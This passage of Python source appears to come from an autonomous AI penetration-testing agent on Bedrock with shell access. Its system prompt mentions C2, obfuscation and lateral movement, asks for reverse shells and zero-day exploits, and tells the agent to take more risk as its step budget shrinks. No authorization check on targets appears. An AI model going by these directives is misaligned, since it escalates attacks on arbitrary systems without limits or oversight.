    - Multi-channel communication
    - Redundant callback mechanisms
    - Traffic obfuscation
    - Automated lateral movement
    '''
    # Complex C2 orchestration logic
```

## COGNITIVE LOAD BALANCE

Questions that guide natural decision-making:

- "What's the most elegant solution here?"
- "Which tool was literally built for this problem?"
- "Can I achieve this with a clever command chain?"
- "Is the complexity justified by the requirement?"

## MEMORY TOOLS FOR EVIDENCE

You have three memory tools that integrate naturally with your workflow:

**memory_store(content, category, metadata)** - Capture findings as you work
**memory_retrieve(query, category, limit)** - Search previous discoveries
**memory_list(category, limit)** - Review all evidence collected

Categories: enumeration, vulnerability, exploitation, access, persistence, data

Store evidence immediately upon discovery - it's part of professional methodology.

## ESCALATION AWARENESS

As steps remaining decrease, your approach naturally evolves:

**Abundant Steps (15-20 remaining):**
- Methodical enumeration
- Careful vulnerability validation
- Standard exploitation techniques

**Moderate Steps (8-14 remaining):**
- Parallel operations
- Combined attack vectors
- Higher risk tolerance

**Critical Steps (3-7 remaining):**
- Aggressive techniques
- Multiple simultaneous attempts
- Novel attack combinations

**Final Steps (1-2 remaining):**
- All-or-nothing approaches
- Highest impact attempts
- Creative solutions

## SUCCESS ACHIEVEMENT

When you successfully complete the objective:
1. Clearly state: "Objective achieved: [detailed technical explanation]"
2. Provide specific evidence of success
3. Run memory_list to display all collected evidence
4. Summarize the attack path taken

Remember: You are an autonomous agent with the expertise of elite penetration testers. Your natural decision-making process leads you to the most effective solutions."""

def analyze_objective_completion(messages):
    """Check if the agent has achieved the objective with evidence"""
    if not messages:
        return False
    
    # Check the last few assistant messages for explicit objective achievement
    for msg in reversed(messages[-3:]):  # Check last 3 messages
        if msg.get("role") == "assistant":
            content = str(msg.get("content", "")).lower()
            if "objective achieved" in content and "cyber_" in content:
                return True
    
    return False

def create_agent(target: str, objective: str, max_steps: int = 100, available_tools: list = None, operation_id: str = None):
    """Create strategic autonomous agent"""
    
    logger.debug(f"Creating strategic agent for target: {target}, objective: {objective}")
    
    # Use provided operation_id or generate new one
    if not operation_id:
        operation_id = f"OP_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    globals()['operation_id'] = operation_id  # Make available to tools
    
    # Initialize mem0 with local FAISS storage
    global mem0_instance
    
    # Set AWS environment variables if not already set
    if not os.environ.get("AWS_REGION"):
        os.environ["AWS_REGION"] = "us-east-1"
    
    config = {
        "llm": {
            "provider": "aws_bedrock",
            "config": {
                "model": "us.anthropic.claude-3-5-haiku-20241022-v1:0",
                "temperature": 0.1,
                "max_tokens": 2000,
                "top_p": 0.9
            }
        },
        "embedder": {
            "provider": "aws_bedrock",
            "config": {
                "model": "amazon.titan-embed-text-v2:0"
            }
        },
        "vector_store": {
            "provider": "faiss",
            "config": {
                "embedding_model_dims": 1024,
                "path": f"./evidence_{operation_id}"
            }
        },
        "version": "v1.1"
    }
    
    # Initialize mem0 with suppressed stderr for credential messages
    import io
    old_stderr = sys.stderr
    sys.stderr = io.StringIO()
    
    try:
        mem0_instance = Memory.from_config(config)
    finally:
        sys.stderr = old_stderr
        
    print(f"{Colors.GREEN}[+] Memory system initialized with AWS Bedrock{Colors.RESET}")
    
    # Include discovered tools in context
    tools_context = ""
    if available_tools:
        tools_context = f"""
## ENVIRONMENTAL CONTEXT

Professional tools discovered in your environment:
{', '.join(available_tools)}

{'**Metasploit Framework is available!** Prioritize using it for exploitation of known vulnerabilities.' if 'metasploit' in available_tools else '**Warning: Metasploit not detected.** Consider manual exploitation techniques.'}

Leverage these tools directly via shell. Create wrappers only when you need sophisticated parsing or chaining.
"""
    
    # Enhanced system prompt with efficiency focus
    system_prompt = f"""{CYBER_AGI_STRATEGIC_PROMPT}

## CURRENT MISSION

Target: {target}
Objective: {objective}
Execution Budget: {max_steps} steps
Operation ID: {operation_id}
{tools_context}

## MISSION EFFICIENCY GUIDELINES

- Use shell commands for direct tool execution (nmap, nikto, sqlmap, gobuster)
- **CRITICAL**: Always add 'exit' to msfconsole commands to prevent hanging
- Create meta-tools when you dont have access to a prebuilt tool (reverse shell, zero-day exploit)
- Create tools in tools/ directory (NOT /tmp/) for hot-reloading
- Document command outputs and parse results strategically
- When you achieve the objective: "Objective achieved: [detailed evidence with flags]"

## EXECUTION PRIORITY

1. Direct reconnaissance with professional tools via shell
2. Evidence generation for all findings
3. Strategic analysis of results
4. Targeted exploitation based on discoveries
5. Validation with concrete proof

Remember: Efficiency and evidence are key. Use the best tool for each job.

Begin your strategic operation."""
    
    # Create callback handler
    callback_handler = StrategicReasoningHandler(max_steps=max_steps)
    
    # Configure model
    logger.debug("Configuring BedrockModel")
    model = BedrockModel(
        model_id="us.anthropic.claude-3-5-sonnet-20241022-v2:0",
        region_name="us-east-1",
        temperature=0.7,
        max_tokens=4096,
        top_p=0.95
    )
    
    # Create agent with strategic capabilities
    logger.debug("Creating autonomous strategic agent")
    agent = Agent(
        model=model,
        tools=[editor, load_tool, shell, memory_store, memory_retrieve, memory_list],  # Core tools + memory
        system_prompt=system_prompt,
        callback_handler=callback_handler,
        conversation_manager=SlidingWindowConversationManager(window_size=120),
        load_tools_from_directory=True,  # Enable hot-reloading
        max_parallel_tools=8  # Enable parallel strategic thinking
    )
    
    logger.debug("Strategic agent initialized successfully")
    return agent, callback_handler

def main():
    """Main execution function"""
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="Autonomous Cyber Security AGI - Strategic Operations"
    )
    parser.add_argument(
        "--objective",
        type=str,
        required=True,
        help="Security assessment objective"
    )
    parser.add_argument(
        "--target",
        type=str,
        required=True,
        help="Target system/network to assess"
    )
    parser.add_argument(
        "--iterations",
        type=int,
        default=100,
        help="Maximum tool executions before stopping (default: 100)"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose output with detailed debug logging"
    )
    
    args = parser.parse_args()
    
    # Initialize logger
    global logger
    logger = setup_logging(verbose=args.verbose)
    
    # Display banner
    print_banner()
    
    # Auto-setup and environment discovery
    available_tools = auto_setup()
    
    # Log operation start
    operation_id = f"OP-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
    logger.info(f"Strategic operation {operation_id} initiated")
    logger.info(f"Objective: {args.objective}")
    logger.info(f"Target: {args.target}")
    logger.info(f"Max steps: {args.iterations}")
    
    # Display operation details
    print_section("MISSION PARAMETERS", f"""
{Colors.BOLD}Operation ID:{Colors.RESET} {Colors.CYAN}{operation_id}{Colors.RESET}
{Colors.BOLD}Objective:{Colors.RESET}    {Colors.YELLOW}{args.objective}{Colors.RESET}
{Colors.BOLD}Target:{Colors.RESET}       {Colors.RED}{args.target}{Colors.RESET}
{Colors.BOLD}Capability Budget:{Colors.RESET} {args.iterations} steps
{Colors.BOLD}Environment:{Colors.RESET} {len(available_tools)} professional tools available
{Colors.BOLD}Mode:{Colors.RESET} Autonomous Strategic Intelligence
""", Colors.CYAN, "🎯")
    
    # Initialize timing
    start_time = time.time()
    callback_handler = None
    
    try:
        # Create strategic agent
        print_status("Initializing strategic cyber AGI...", "INFO")
        agent, callback_handler = create_agent(
            target=args.target,
            objective=args.objective,
            max_steps=args.iterations,
            available_tools=available_tools
        )
        print_status("Strategic AGI online and reasoning", "SUCCESS")
        
        # Set environment variables
        if not os.environ.get("AWS_REGION"):
            os.environ["AWS_REGION"] = "us-east-1"
        os.environ["DEV"] = "true"
        
        # Initial strategic prompt - minimal guidance
        initial_prompt = f"""I need you to assess {args.target} with the objective: {args.objective}

You have {args.iterations} steps available. Professional tools found in environment: {', '.join(available_tools) if available_tools else 'none'}

Think strategically about how to approach this challenge. What information do you need? What capabilities would help? How can you build on discoveries?

Begin your autonomous operation."""
        
        print_status(f"Commencing strategic operation...", "STRATEGIC")
        print_section("AUTONOMOUS ACTIVITY", "Strategic reasoning in progress:", Colors.MAGENTA, "🧠")
        print(f"\n{Colors.DIM}{'─'*80}{Colors.RESET}\n")
        
        # Execute autonomous operation
        try:
            operation_start = time.time()
            messages = []
            current_message = initial_prompt
            
            # Allow agent to operate autonomously
            while True:
                # Execute with the agent
                result = agent(current_message, messages=messages)
                
                # Update conversation history
                if messages:
                    messages.append({"role": "user", "content": current_message})
                messages.append({"role": "assistant", "content": str(result)})
                
                # Check if objective is complete
                if analyze_objective_completion(messages):
                    print_status("Objective achieved through strategic execution!", "SUCCESS")
                    strategic_summary = callback_handler.get_strategic_summary()
                    print_status(f"Memory operations: {strategic_summary['memory_operations']}", "INFO")
                    print_status(f"Capabilities created: {strategic_summary['tools_created']}", "INFO")
                    print_status(f"Evidence collected: {strategic_summary['evidence_collected']} items", "INFO")
                    break
                
                # Check execution limit
                if callback_handler.has_reached_limit():
                    print_status(f"Execution limit reached ({args.iterations})", "WARNING")
                    print_status("Consider increasing iterations for deeper operations", "INFO")
                    break
                
                # Minimal continuation prompt - let the agent think
                remaining = args.iterations - callback_handler.steps
                current_message = f"""Continue your assessment. {remaining} steps remaining.

Reflect on what you've learned and adapt your strategy accordingly."""
                
                time.sleep(0.5)
            
            execution_time = time.time() - operation_start
            logger.info(f"Strategic operation completed in {execution_time:.2f} seconds")
            
        except Exception as e:
            logger.error(f"Operation error: {str(e)}")
            raise
        
        # Display comprehensive results
        print(f"\n{'='*80}")
        print(f"🧠 {Colors.BOLD}OPERATION SUMMARY{Colors.RESET}")
        print(f"{'='*80}")
        
        # Strategic summary
        if callback_handler:
            strategic_summary = callback_handler.get_strategic_summary()
            elapsed_time = time.time() - start_time
            minutes = int(elapsed_time // 60)
            seconds = int(elapsed_time % 60)
            
            print(f"{Colors.BOLD}Operation ID:{Colors.RESET}      {operation_id}")
            print(f"{Colors.BOLD}Status:{Colors.RESET}            {Colors.GREEN}✅ Objective Achieved{Colors.RESET}" if analyze_objective_completion(messages) else f"{Colors.YELLOW}⚠️  Execution Limit Reached{Colors.RESET}")
            print(f"{Colors.BOLD}Duration:{Colors.RESET}          {minutes}m {seconds}s")
            
            print(f"\n{Colors.BOLD}📊 Execution Metrics:{Colors.RESET}")
            print(f"  • Total Steps: {strategic_summary['total_steps']}/{args.iterations}")
            print(f"  • Tools Created: {strategic_summary['tools_created']}")
            print(f"  • Evidence Collected: {strategic_summary['evidence_collected']} items")
            print(f"  • Memory Operations: {strategic_summary['memory_operations']} total")
            
            if strategic_summary['capability_expansion']:
                print(f"\n{Colors.BOLD}🔧 Capabilities Created:{Colors.RESET}")
                for tool in strategic_summary['capability_expansion']:
                    print(f"  • {Colors.GREEN}{tool}{Colors.RESET}")
            
            # Show evidence summary if available
            evidence_summary = callback_handler.get_evidence_summary()
            if isinstance(evidence_summary, list) and evidence_summary:
                print(f"\n{Colors.BOLD}🎯 Key Evidence:{Colors.RESET}")
                if isinstance(evidence_summary[0], dict):
                    for ev in evidence_summary[:5]:
                        cat = ev.get('category', 'unknown')
                        content = ev.get('content', '')[:60]
                        print(f"  • [{cat}] {content}...")
                    if len(evidence_summary) > 5:
                        print(f"  • ... and {len(evidence_summary) - 5} more items")
            
            print(f"\n{Colors.BOLD}💾 Evidence stored in:{Colors.RESET} ./evidence_{operation_id}.faiss")
            print(f"{'='*80}")
        
    except KeyboardInterrupt:
        print_status("\nOperation cancelled by user", "WARNING")
        sys.exit(1)
        
    except Exception as e:
        print_status(f"\nOperation failed: {str(e)}", "ERROR")
        logger.exception("Operation failed")
        sys.exit(1)
        
    finally:
        # Log operation end
        end_time = time.time()
        total_time = end_time - start_time
        logger.info(f"Strategic operation {operation_id} ended after {total_time:.2f}s")
        

if __name__ == "__main__":
    main()